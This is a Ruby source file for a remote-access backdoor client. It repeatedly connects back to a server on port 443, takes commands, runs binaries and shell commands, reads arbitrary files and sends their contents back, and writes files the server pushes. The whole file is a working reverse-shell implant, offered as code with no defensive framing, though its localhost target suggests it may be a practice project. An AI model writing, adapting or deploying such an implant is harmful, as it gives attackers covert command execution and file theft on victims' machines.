require 'socket'
require 'timeout'
require 'Open3'

SIZE = 1024 * 1024 * 10
PORT = 443
HOST = 'localhost'
PERIOD = 5

def cli_puts (*string)
  printf('cli$: ')
  puts string
end





#################################
#COMMAND INTERPRETER MODULE BEGIN
#################################
def interpret (command)
  if command.byteslice(0, 4) == 'exec'
    retval = exec(command)
  elsif command.byteslice(0, 3) == 'sys'
    retval = syscall(command)
  elsif command.byteslice(0, 3) == 'get'
    retval = getfile(command)
  elsif command.byteslice(0, 4) == 'send'
    retval = command
  elsif command.byteslice(0, 4) == 'help'
    retval = "cli:$ available commands: \r\n
            exec #file #arguments: executes binary with given arguments\r\n
            system #command: runs command line command\r\n
            Please enter your command:"
  else
    retval = "cli:$ unknown command, please reenter"
  end
  return retval
end
###############################
#COMMAND INTERPRETER MODULE END
###############################






#########################
#FILE SENDER MODULE BEGIN
#########################
def getfile (command)
  mcmd = command.split(" ", 3)
  file = open(mcmd[1], "rb")
  fileContent = file.read
  file.close
  return fileContent
end
#######################
#FILE SENDER MODULE END
#######################







####################################
#FILE EXECUTION COMMAND MODULE BEGIN
####################################
def exec (command)

  mcmd = command.split(" ", 3) #splitting to a maximum of 3 elements: argument will be one
  if mcmd[mcmd.length-1] == ""
    mcmd.delete_at(mcmd.length-1)
  end

  begin
  Timeout::timeout(20) {
    retval = IO.popen(mcmd[1])
    return 'popen_retval:' + retval.to_s
  }

  rescue Exception => e
    return "binary execution failed/ timed out (20sec): " + e.to_s
  end

end

##################################
#FILE EXECUTION COMMAND MODULE END
##################################








#######################################
#COMMAND EXECUTION COMMAND MODULE BEGIN
#######################################
def syscall (command)
  mcmd = command.split(" ", 3) #splitting to a maximum of 3 elements: argument will be one
  #dropping the last item if empty
  if mcmd[mcmd.length-1] == ""
    mcmd.delete_at(mcmd.length-1)
  end

  begin
    Timeout::timeout(20) {
      #if one argument passed
      if mcmd[2] == nil
        retval, err, st = Open3.capture3(mcmd[1])
      else
        retval, err, st = Open3.capture3(mcmd[1], mcmd[2])
      end

      return st.to_s + "\r\n open3_retval: " + retval.to_s + "\r\n err: " + err.to_s
      #if execution succeeded, return the output

    }
  rescue Exception => e
    return "command execution timed out: ", e
  end

end
#####################################
#COMMAND EXECUTION COMMAND MODULE END
#####################################

#cli_puts "TCP client is starting up."

loop {
#loop for attempting connections in every 30 secs
  sleep(PERIOD)
  begin #rescue block: from server not found error
    server = TCPSocket.open(HOST, PORT)

    printf("cli$: connected to server at %s on port %d \n", Time.now.ctime.to_s, PORT)

    ###############################
    #COMMAND RECEIVER MODULE BEGINS
    ###############################
    server.puts 'cli$: enter your command EOC'
    #i = 1
    loop {
      #i+=1
      #puts 'loop' + i.to_s


      command = server.gets.chomp()
      if command != nil && command != "" && command != " "
        command = command.strip()
        #command = command.delete!("\n")
                      #.slice(0, command.length()-3)
        eocpos = command =~ /EOC/
        if eocpos != nil && eocpos > 0 # returns the index where EOC substring starts
            command = command.byteslice(0, eocpos)
        else
        #
        end

        cli_puts('command received from server: ' + command)
        if command.byteslice(0,4) == 'send'
          begin
            printf '1'
            ftw = command.split(" ", 3)[1].split("\\", 2)[1]
            printf '2'
            #data = sock.read
            data = server.gets()
            printf '3'
            destFile = File.open(ftw, 'wb')
            printf '4'
            destFile.print data
            printf '5'
            destFile.close

            file_size = File.size(destFile) / 1024 / 1024
            result = 'file received: ' + ftw + 'size: ' + file_size
            cli_puts(result)
            server.puts result + "\r\n EOC"
          rescue IOError
              #do not leave on closed stream error
          end
        end
        command_result = interpret(command)
        server.puts command_result + "\r\n cli$: enter your command EOC"

      else
        #no command arrived
      end


    }


    ###############################
    #COMMAND RECEIVER MODULE ENDS
    ###############################


    server.close()
  rescue Exception => e
    #rescue from any error:
    if(e.class.name.start_with?('Errno::ECONNREFUSED'))
      printf("cli$: could not establish connection to server %s/%d at %s \n", HOST, PORT, Time.now.ctime.to_s)
    else
      #for Debugging
      cli_puts 'cli:$ error: ' + e.message
      cli_puts 'cli:$ trace: ' + e.backtrace.inspect
    end
    #nothing happens here, we keep attempting to connect
    end

}






